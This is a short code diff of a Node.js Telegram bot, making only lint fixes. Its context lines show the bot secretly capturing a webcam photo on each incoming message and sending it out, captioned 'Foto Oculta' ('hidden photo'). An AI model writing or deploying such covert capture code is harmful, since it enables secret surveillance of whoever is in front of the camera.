@@ -1,3 +1,4 @@
+/*jshint esversion: 6 */
 var NodeWebcam = require("node-webcam");
 const TelegramBot = require('node-telegram-bot-api');
 
@@ -31,7 +32,7 @@ bot.on('message', (msg) => {
   Webcam.capture("Foto", function(err, data) {
     bot.sendPhoto(chatId, "Foto.jpg", {
       caption: "Foto Oculta"
-    })
+    });
     console.log("Foto Enviada");
   });
 });
